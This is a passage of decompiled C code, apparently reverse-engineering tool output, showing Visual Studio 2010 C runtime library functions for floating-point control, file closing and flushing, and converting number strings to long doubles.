                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



/* Function: __controlfp_s */

/* Library Function - Single Match
    __controlfp_s
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    FUN_004087f3();
  }
  return eVar3;
}



/* Function: ___initconout */

/* Library Function - Single Match
    ___initconout
   
   Library: Visual Studio 2010 Release */

void __cdecl ___initconout(void)

{
  DAT_00419f30 = CreateFileW(L"CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  return;
}



/* Function: FUN_00410add */

void FUN_00410add(void)

{
  if ((DAT_00419f30 != (HANDLE)0xffffffff) && (DAT_00419f30 != (HANDLE)0xfffffffe)) {
    CloseHandle(DAT_00419f30);
  }
  return;
}



/* Function: __fclose_nolock */

/* Library Function - Single Match
    __fclose_nolock
   
   Library: Visual Studio 2010 Release */

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    iVar3 = -1;
  }
  else {
    if ((_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



/* Function: _fclose */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    _fclose
   
   Library: Visual Studio 2010 Release */

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    local_20 = -1;
  }
  else if ((_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_00410bcd();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



/* Function: FUN_00410bcd */

void FUN_00410bcd(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



/* Function: __commit */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __commit
   
   Library: Visual Studio 2010 Release */

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041eaa8)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_0041eac0)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_0041eac0)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_00410c8e;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_00410c8e:
        FUN_00410ca6();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_004087f3();
  }
  return -1;
}



/* Function: FUN_00410ca6 */

void FUN_00410ca6(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



/* Function: FID_conflict:__ld12tod */

/* Library Function - Multiple Matches With Different Base Names
    __ld12tod
    __ld12tof
   
   Library: Visual Studio 2010 Release */

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  ushort uVar1;
  undefined4 uVar2;
  byte bVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  INTRNCVT_STATUS IVar7;
  byte bVar8;
  uint *puVar9;
  uint *puVar10;
  uint uVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  int iVar16;
  bool bVar17;
  uint local_2c;
  uint local_24;
  uint local_14 [4];
  
  local_14[3] = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  uVar1 = *(ushort *)(_Ifp->ld12 + 10);
  uVar15 = *(uint *)(_Ifp->ld12 + 6);
  local_14[0] = uVar15;
  uVar2 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar12 = uVar1 & 0x7fff;
  iVar13 = uVar12 - 0x3fff;
  iVar5 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_14[1] = uVar2;
  local_14[2] = iVar5;
  bVar3 = (byte)DAT_00419f40;
  if (iVar13 == -0x3fff) {
    iVar14 = 0;
    iVar5 = 0;
    do {
      if (local_14[iVar5] != 0) {
        local_14[0] = 0;
        local_14[1] = 0;
        local_14[2] = 0;
        break;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 3);
  }
  else {
    bVar4 = false;
    iVar16 = DAT_00419f3c + -1;
    iVar14 = (int)(DAT_00419f3c + (DAT_00419f3c >> 0x1f & 0x1fU)) >> 5;
    puVar10 = local_14 + iVar14;
    bVar8 = 0x1f - ((byte)DAT_00419f3c & 0x1f);
    if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
      uVar11 = local_14[iVar14] & ~(-1 << (bVar8 & 0x1f));
      iVar6 = iVar14;
      while( true ) {
        if (uVar11 != 0) {
          iVar6 = (int)(iVar16 + (iVar16 >> 0x1f & 0x1fU)) >> 5;
          uVar11 = 1 << (0x1f - ((byte)iVar16 & 0x1f) & 0x1f);
          puVar9 = local_14 + iVar6;
          local_24 = *puVar9 + uVar11;
          if (local_24 < *puVar9) goto LAB_00410df2;
          bVar17 = local_24 < uVar11;
          do {
            bVar4 = false;
            if (!bVar17) goto LAB_00410df9;
LAB_00410df2:
            do {
              bVar4 = true;
LAB_00410df9:
              iVar6 = iVar6 + -1;
              *puVar9 = local_24;
              if ((iVar6 < 0) || (!bVar4)) goto LAB_00410e07;
              puVar9 = local_14 + iVar6;
              local_24 = *puVar9 + 1;
            } while (local_24 < *puVar9);
            bVar17 = local_24 == 0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        uVar11 = local_14[iVar6];
      }
    }
LAB_00410e07:
    *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
    iVar14 = iVar14 + 1;
    if (iVar14 < 3) {
      puVar10 = local_14 + iVar14;
      for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {
        *puVar10 = 0;
        puVar10 = puVar10 + 1;
      }
    }
    iVar14 = iVar13;
    if (bVar4) {
      iVar14 = uVar12 - 0x3ffe;
    }
    if (iVar14 < DAT_00419f38 - DAT_00419f3c) {
      local_14[0] = 0;
      local_14[1] = 0;
      local_14[2] = 0;
    }
    else {
      if (DAT_00419f38 < iVar14) {
        if (iVar14 < DAT_00419f34) {
          iVar14 = iVar14 + DAT_00419f48;
          local_14[0] = local_14[0] & 0x7fffffff;
          iVar5 = (int)(DAT_00419f40 + (DAT_00419f40 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
        }
        else {
          local_14[1] = 0;
          local_14[2] = 0;
          local_14[0] = 0x80000000;
          iVar5 = (int)(DAT_00419f40 + (DAT_00419f40 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
          iVar14 = DAT_00419f48 + DAT_00419f34;
        }
        goto LAB_004111b2;
      }
      iVar13 = DAT_00419f38 - iVar13;
      local_14[0] = uVar15;
      local_14[1] = uVar2;
      iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = (byte)iVar13 & 0x1f;
      local_14[2] = iVar5;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar5 = 2;
      puVar10 = local_14 + (2 - iVar14);
      do {
        if (iVar5 < iVar14) {
          local_14[iVar5] = 0;
        }
        else {
          local_14[iVar5] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar5 = iVar5 + -1;
      } while (-1 < iVar5);
      iVar13 = DAT_00419f3c + -1;
      iVar5 = (int)(DAT_00419f3c + (DAT_00419f3c >> 0x1f & 0x1fU)) >> 5;
      bVar8 = 0x1f - ((byte)DAT_00419f3c & 0x1f);
      puVar10 = local_14 + iVar5;
      if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
        uVar15 = local_14[iVar5] & ~(-1 << (bVar8 & 0x1f));
        iVar14 = iVar5;
        while (uVar15 == 0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00410fa6;
          uVar15 = local_14[iVar14];
        }
        iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
        bVar4 = false;
        uVar11 = 1 << (0x1f - ((byte)iVar13 & 0x1f) & 0x1f);
        uVar12 = local_14[iVar14];
        uVar15 = uVar12 + uVar11;
        if ((uVar15 < uVar12) || (uVar15 < uVar11)) {
          bVar4 = true;
        }
        local_14[iVar14] = uVar15;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar4))) {
          uVar12 = local_14[iVar14];
          uVar15 = uVar12 + 1;
          bVar4 = false;
          if ((uVar15 < uVar12) || (uVar15 == 0)) {
            bVar4 = true;
          }
          local_14[iVar14] = uVar15;
        }
      }
LAB_00410fa6:
      *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
      iVar5 = iVar5 + 1;
      if (iVar5 < 3) {
        puVar10 = local_14 + iVar5;
        for (iVar13 = 3 - iVar5; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar5 = (int)(DAT_00419f40 + 1 + (DAT_00419f40 + 1 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = bVar3 + 1 & 0x1f;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar13 = 2;
      puVar10 = local_14 + (2 - iVar5);
      do {
        if (iVar13 < iVar5) {
          local_14[iVar13] = 0;
        }
        else {
          local_14[iVar13] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar13 = iVar13 + -1;
      } while (-1 < iVar13);
    }
    iVar14 = 0;
  }
LAB_004111b2:
  uVar15 = iVar14 << (0x1f - bVar3 & 0x1f) | -(uint)((uVar1 & 0x8000) != 0) & 0x80000000 |
           local_14[0];
  if (DAT_00419f44 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar15;
    *(uint *)&_D->x = local_14[1];
  }
  else if (DAT_00419f44 == 0x20) {
    *(uint *)&_D->x = uVar15;
  }
  IVar7 = __security_check_cookie(local_14[3] ^ (uint)&stack0xfffffffc);
  return IVar7;
}



/* Function: FID_conflict:__ld12tod */

/* Library Function - Multiple Matches With Different Base Names
    __ld12tod
    __ld12tof
   
   Library: Visual Studio 2010 Release */

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  ushort uVar1;
  undefined4 uVar2;
  byte bVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  INTRNCVT_STATUS IVar7;
  byte bVar8;
  uint *puVar9;
  uint *puVar10;
  uint uVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  int iVar16;
  bool bVar17;
  uint local_2c;
  uint local_24;
  uint local_14 [4];
  
  local_14[3] = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  uVar1 = *(ushort *)(_Ifp->ld12 + 10);
  uVar15 = *(uint *)(_Ifp->ld12 + 6);
  local_14[0] = uVar15;
  uVar2 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar12 = uVar1 & 0x7fff;
  iVar13 = uVar12 - 0x3fff;
  iVar5 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_14[1] = uVar2;
  local_14[2] = iVar5;
  bVar3 = (byte)DAT_00419f58;
  if (iVar13 == -0x3fff) {
    iVar14 = 0;
    iVar5 = 0;
    do {
      if (local_14[iVar5] != 0) {
        local_14[0] = 0;
        local_14[1] = 0;
        local_14[2] = 0;
        break;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 3);
  }
  else {
    bVar4 = false;
    iVar16 = DAT_00419f54 + -1;
    iVar14 = (int)(DAT_00419f54 + (DAT_00419f54 >> 0x1f & 0x1fU)) >> 5;
    puVar10 = local_14 + iVar14;
    bVar8 = 0x1f - ((byte)DAT_00419f54 & 0x1f);
    if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
      uVar11 = local_14[iVar14] & ~(-1 << (bVar8 & 0x1f));
      iVar6 = iVar14;
      while( true ) {
        if (uVar11 != 0) {
          iVar6 = (int)(iVar16 + (iVar16 >> 0x1f & 0x1fU)) >> 5;
          uVar11 = 1 << (0x1f - ((byte)iVar16 & 0x1f) & 0x1f);
          puVar9 = local_14 + iVar6;
          local_24 = *puVar9 + uVar11;
          if (local_24 < *puVar9) goto LAB_00411343;
          bVar17 = local_24 < uVar11;
          do {
            bVar4 = false;
            if (!bVar17) goto LAB_0041134a;
LAB_00411343:
            do {
              bVar4 = true;
LAB_0041134a:
              iVar6 = iVar6 + -1;
              *puVar9 = local_24;
              if ((iVar6 < 0) || (!bVar4)) goto LAB_00411358;
              puVar9 = local_14 + iVar6;
              local_24 = *puVar9 + 1;
            } while (local_24 < *puVar9);
            bVar17 = local_24 == 0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        uVar11 = local_14[iVar6];
      }
    }
LAB_00411358:
    *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
    iVar14 = iVar14 + 1;
    if (iVar14 < 3) {
      puVar10 = local_14 + iVar14;
      for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {
        *puVar10 = 0;
        puVar10 = puVar10 + 1;
      }
    }
    iVar14 = iVar13;
    if (bVar4) {
      iVar14 = uVar12 - 0x3ffe;
    }
    if (iVar14 < DAT_00419f50 - DAT_00419f54) {
      local_14[0] = 0;
      local_14[1] = 0;
      local_14[2] = 0;
    }
    else {
      if (DAT_00419f50 < iVar14) {
        if (iVar14 < DAT_00419f4c) {
          iVar14 = iVar14 + DAT_00419f60;
          local_14[0] = local_14[0] & 0x7fffffff;
          iVar5 = (int)(DAT_00419f58 + (DAT_00419f58 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
        }
        else {
          local_14[1] = 0;
          local_14[2] = 0;
          local_14[0] = 0x80000000;
          iVar5 = (int)(DAT_00419f58 + (DAT_00419f58 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
          iVar14 = DAT_00419f60 + DAT_00419f4c;
        }
        goto LAB_00411703;
      }
      iVar13 = DAT_00419f50 - iVar13;
      local_14[0] = uVar15;
      local_14[1] = uVar2;
      iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = (byte)iVar13 & 0x1f;
      local_14[2] = iVar5;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar5 = 2;
      puVar10 = local_14 + (2 - iVar14);
      do {
        if (iVar5 < iVar14) {
          local_14[iVar5] = 0;
        }
        else {
          local_14[iVar5] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar5 = iVar5 + -1;
      } while (-1 < iVar5);
      iVar13 = DAT_00419f54 + -1;
      iVar5 = (int)(DAT_00419f54 + (DAT_00419f54 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = 0x1f - ((byte)DAT_00419f54 & 0x1f);
      puVar10 = local_14 + iVar5;
      if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
        uVar15 = local_14[iVar5] & ~(-1 << (bVar8 & 0x1f));
        iVar14 = iVar5;
        while (uVar15 == 0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_004114f7;
          uVar15 = local_14[iVar14];
        }
        iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
        bVar4 = false;
        uVar11 = 1 << (0x1f - ((byte)iVar13 & 0x1f) & 0x1f);
        uVar12 = local_14[iVar14];
        uVar15 = uVar12 + uVar11;
        if ((uVar15 < uVar12) || (uVar15 < uVar11)) {
          bVar4 = true;
        }
        local_14[iVar14] = uVar15;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar4))) {
          uVar12 = local_14[iVar14];
          uVar15 = uVar12 + 1;
          bVar4 = false;
          if ((uVar15 < uVar12) || (uVar15 == 0)) {
            bVar4 = true;
          }
          local_14[iVar14] = uVar15;
        }
      }
LAB_004114f7:
      *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
      iVar5 = iVar5 + 1;
      if (iVar5 < 3) {
        puVar10 = local_14 + iVar5;
        for (iVar13 = 3 - iVar5; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar5 = (int)(DAT_00419f58 + 1 + (DAT_00419f58 + 1 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = bVar3 + 1 & 0x1f;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar13 = 2;
      puVar10 = local_14 + (2 - iVar5);
      do {
        if (iVar13 < iVar5) {
          local_14[iVar13] = 0;
        }
        else {
          local_14[iVar13] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar13 = iVar13 + -1;
      } while (-1 < iVar13);
    }
    iVar14 = 0;
  }
LAB_00411703:
  uVar15 = iVar14 << (0x1f - bVar3 & 0x1f) | -(uint)((uVar1 & 0x8000) != 0) & 0x80000000 |
           local_14[0];
  if (DAT_00419f5c == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar15;
    *(uint *)&_D->x = local_14[1];
  }
  else if (DAT_00419f5c == 0x20) {
    *(uint *)&_D->x = uVar15;
  }
  IVar7 = __security_check_cookie(local_14[3] ^ (uint)&stack0xfffffffc);
  return IVar7;
}



/* Function: ___strgtold12_l */

/* Library Function - Single Match
    ___strgtold12_l
   
   Library: Visual Studio 2010 Release */

uint __cdecl
___strgtold12_l(_LDBL12 *pld12,char **p_end_ptr,char *str,int mult12,int scale,int decpt,
               int implicit_E,_locale_t _Locale)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  bool bVar6;
  ushort uVar7;
  char cVar8;
  ushort uVar9;
  int *piVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  ushort uVar15;
  int iVar16;
  undefined **ppuVar17;
  char *pcVar18;
  undefined4 uVar19;
  undefined **ppuVar20;
  ushort uVar21;
  undefined4 uVar22;
  char *pcVar23;
  short *psVar24;
  int local_6c;
  int local_68;
  undefined **local_64;
  ushort *local_60;
  int local_5c;
  char *local_58;
  int local_54;
  uint local_50;
  undefined2 local_4c;
  undefined4 uStack_4a;
  undefined2 uStack_46;
  undefined *local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 uStack_38;
  byte local_30;
  undefined1 uStack_2f;
  undefined4 uStack_2e;
  undefined4 uStack_2a;
  ushort uStack_26;
  char local_24 [23];
  char local_d;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  iVar16 = 0;
  pcVar23 = local_24;
  uVar7 = 0;
  local_6c = 1;
  local_50 = 0;
  bVar4 = false;
  bVar6 = false;
  bVar5 = false;
  local_68 = 0;
  local_54 = 0;
  if (_Locale != (_locale_t)0x0) {
    local_58 = str;
    for (; (((cVar8 = *str, cVar8 == ' ' || (cVar8 == '\t')) || (cVar8 == '\n')) || (cVar8 == '\r'))
        ; str = str + 1) {
    }
LAB_004117cd:
    cVar8 = *str;
    pcVar18 = str + 1;
    switch(iVar16) {
    case 0:
      if ((byte)(cVar8 - 0x31U) < 9) {
LAB_004117e8:
        iVar16 = 3;
        goto LAB_004117ea;
      }
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) {
LAB_004117ff:
        iVar16 = 5;
        str = pcVar18;
      }
      else if (cVar8 == '+') {
        uVar7 = 0;
        iVar16 = 2;
        str = pcVar18;
      }
      else {
        if (cVar8 != '-') {
          if (cVar8 == '0') goto LAB_00411819;
          goto LAB_00411995;
        }
        iVar16 = 2;
        uVar7 = 0x8000;
        str = pcVar18;
      }
      goto LAB_004117cd;
    case 1:
      bVar4 = true;
      if ((byte)(cVar8 - 0x31U) < 9) goto LAB_004117e8;
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_0041184e;
      if ((cVar8 == '+') || (cVar8 == '-')) goto LAB_00411878;
      if (cVar8 == '0') goto LAB_00411819;
      goto LAB_0041185e;
    case 2:
      if ((byte)(cVar8 - 0x31U) < 9) goto LAB_004117e8;
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_004117ff;
      str = local_58;
      if (cVar8 != '0') goto LAB_004119be;
LAB_00411819:
      iVar16 = 1;
      str = pcVar18;
      goto LAB_004117cd;
    case 3:
      while (('/' < cVar8 && (cVar8 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar23 = cVar8 + -0x30;
          pcVar23 = pcVar23 + 1;
        }
        else {
          local_54 = local_54 + 1;
        }
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
      if (cVar8 != **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_004118e6;
LAB_0041184e:
      bVar4 = true;
      iVar16 = 4;
      str = pcVar18;
      goto LAB_004117cd;
    case 4:
      bVar6 = true;
      if (local_50 == 0) {
        while (cVar8 == '0') {
          local_54 = local_54 + -1;
          cVar8 = *pcVar18;
          pcVar18 = pcVar18 + 1;
        }
      }
      while (('/' < cVar8 && (cVar8 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar23 = cVar8 + -0x30;
          pcVar23 = pcVar23 + 1;
          local_54 = local_54 + -1;
        }
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
LAB_004118e6:
      if ((cVar8 == '+') || (cVar8 == '-')) {
LAB_00411878:
        bVar4 = true;
        iVar16 = 0xb;
        str = pcVar18 + -1;
      }
      else {
LAB_0041185e:
        bVar4 = true;
        if ((cVar8 < 'D') || (('E' < cVar8 && (1 < (byte)(cVar8 + 0x9cU))))) goto LAB_00411995;
        iVar16 = 6;
        str = pcVar18;
      }
      goto LAB_004117cd;
    case 5:
      bVar6 = true;
      str = local_58;
      if ((byte)(cVar8 - 0x30U) < 10) {
        iVar16 = 4;
        goto LAB_004117ea;
      }
      goto LAB_004119be;
    case 6:
      local_58 = str + -1;
      if (8 < (byte)(cVar8 - 0x31U)) {
        if (cVar8 == '+') goto LAB_0041197c;
        if (cVar8 == '-') goto LAB_00411970;
LAB_00411963:
        str = local_58;
        if (cVar8 != '0') goto LAB_004119be;
        iVar16 = 8;
        str = pcVar18;
        goto LAB_004117cd;
      }
      break;
    case 7:
      if (8 < (byte)(cVar8 - 0x31U)) goto LAB_00411963;
      break;
    case 8:
      bVar5 = true;
      while (cVar8 == '0') {
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
      if (8 < (byte)(cVar8 - 0x31U)) goto LAB_00411995;
      break;
    case 9:
      bVar5 = true;
      local_68 = 0;
      goto LAB_00411a20;
    default:
      goto switchD_004117d9_caseD_a;
    case 0xb:
      if (implicit_E != 0) {
        local_58 = str;
        if (cVar8 == '+') {
LAB_0041197c:
          iVar16 = 7;
          str = pcVar18;
        }
        else {
          if (cVar8 != '-') goto LAB_004119be;
LAB_00411970:
          local_6c = -1;
          iVar16 = 7;
          str = pcVar18;
        }
        goto LAB_004117cd;
      }
      iVar16 = 10;
      pcVar18 = str;
switchD_004117d9_caseD_a:
      str = pcVar18;
      if (iVar16 != 10) goto LAB_004117cd;
      goto LAB_004119be;
    }
    iVar16 = 9;
LAB_004117ea:
    str = pcVar18 + -1;
    goto LAB_004117cd;
  }
  piVar10 = __errno();
  *piVar10 = 0x16;
  FUN_004087f3();
  uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
  uVar13 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
  goto LAB_00411deb;
LAB_00411a20:
  if ((cVar8 < '0') || ('9' < cVar8)) goto LAB_00411a3b;
  local_68 = local_68 * 10 + -0x30 + (int)cVar8;
  if (local_68 < 0x1451) {
    cVar8 = *pcVar18;
    pcVar18 = pcVar18 + 1;
    goto LAB_00411a20;
  }
  local_68 = 0x1451;
LAB_00411a3b:
  while (('/' < cVar8 && (cVar8 < ':'))) {
    cVar8 = *pcVar18;
    pcVar18 = pcVar18 + 1;
  }
LAB_00411995:
  str = pcVar18 + -1;
LAB_004119be:
  *p_end_ptr = str;
  if (bVar4) {
    if (0x18 < local_50) {
      if ('\x04' < local_d) {
        local_d = local_d + '\x01';
      }
      pcVar23 = pcVar23 + -1;
      local_54 = local_54 + 1;
      local_50 = 0x18;
    }
    if (local_50 == 0) goto LAB_00411dcc;
    while (pcVar23 = pcVar23 + -1, *pcVar23 == '\0') {
      local_50 = local_50 - 1;
      local_54 = local_54 + 1;
    }
    ___mtold12(local_24,local_50,&local_40);
    iVar2 = CONCAT22(local_3c._2_2_,(undefined2)local_3c);
